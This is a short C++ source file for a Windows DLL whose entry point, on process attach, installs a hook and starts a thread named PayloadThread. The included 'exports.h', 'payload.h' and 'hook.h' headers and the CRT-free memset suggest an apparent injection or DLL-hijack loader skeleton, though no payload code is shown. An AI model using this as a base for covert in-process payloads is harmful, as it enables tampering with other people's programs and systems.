#include <windows.h>
#include "exports.h"
#include "payload.h"
#include "hook.h"

#pragma function(memset)

extern "C" void* __cdecl memset(void* ptr, int value, size_t num) {
    unsigned char* p = static_cast<unsigned char*>(ptr);
    for (size_t i = 0; i < num; ++i) {
        p[i] = static_cast<unsigned char>(value);
    }
    return ptr;
}

BOOL APIENTRY DllEntry(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        InstallHook();

        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}